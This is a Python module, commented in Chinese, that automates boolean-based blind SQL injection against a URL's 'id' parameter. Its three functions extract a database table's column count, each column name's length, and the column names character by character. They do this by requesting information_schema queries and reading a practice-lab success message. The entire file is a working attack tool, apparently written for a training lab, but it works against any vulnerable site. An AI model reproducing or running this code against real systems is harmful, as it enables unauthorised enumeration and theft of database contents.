'''
    表的字段的操作函数库
'''

import requests
from lxml import etree


def GetCluCount(main_url, DBName, TableName):
    # 数据表里的字段数量
    # print("# 正在获取字段数量")
    url = main_url+"?id=1' and if((select count(*)column_name from information_schema.columns where table_schema='{}'and table_name='{}')={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, TableName, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetCluNameLen(main_url, DBName, TableName, t):
    # 字段长度
    # print("# 正在获取第%d个字段长度"%t)
    url = main_url+"?id=1' and if((select length(column_name) from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1)={},1,0) --+"
    for i in range(20):
        test_url = url.format(DBName, TableName, t-1, i)
        req = requests.get(test_url)
        tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
        if (tag == 'You are in...........'):
            return i


def GetCluName(main_url, DBName, TableName, CluNameLen, t):
    # 字段名
    # print("# 正在获取字段名")
    clu_name = ""
    url = main_url+"?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1))={},1,0) --+"
    for i in range(CluNameLen+1):
        for j in range(48, 122):
            test_url = url.format(DBName, TableName, t-1, i, j)
            req = requests.get(test_url)
            tag = etree.HTML(req.text).xpath("/html/body/div/font/font/text()")[0]
            if(tag == 'You are in...........'):
                # print("*第%d个字母是"%i+chr(j))
                clu_name += chr(j)
    return clu_name